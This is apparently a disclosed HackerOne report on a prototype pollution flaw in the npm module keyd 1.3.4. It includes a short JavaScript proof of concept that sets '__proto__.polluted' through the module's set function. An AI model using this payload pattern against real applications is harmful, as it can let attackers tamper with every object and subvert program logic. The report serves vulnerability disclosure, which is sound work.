# [H] [keyd] Prototype pollution

## Summary
Severity: High
Program: Node.js third-party modules
Weakness: Modification of Assumed-Immutable Data (MAID)
Reporter: d3lla
State: resolved
Disclosed: 2020-09-14T10:51:47.788Z
Source: https://hackerone.com/reports/877515

## Details
I would like to report a `prototype pollution` vulnerability in `keyd` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `keyd`
**version:** `1.3.4`
**npm page:** `https://www.npmjs.com/package/keyd`

## Module Description

A small library for using and manipulating key paths in JavaScript.

## Module Stats

[71] weekly downloads

# Vulnerability

## Vulnerability Description

The `set` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `keyd` module:
    - `npm i keyd`

Set the `__proto__.polluted` property of an object:
```javascript

const keyd = require('keyd');
const obj = {};
console.log("Before : " + obj.polluted);
keyd({}).set('__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:
```console
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/877515_
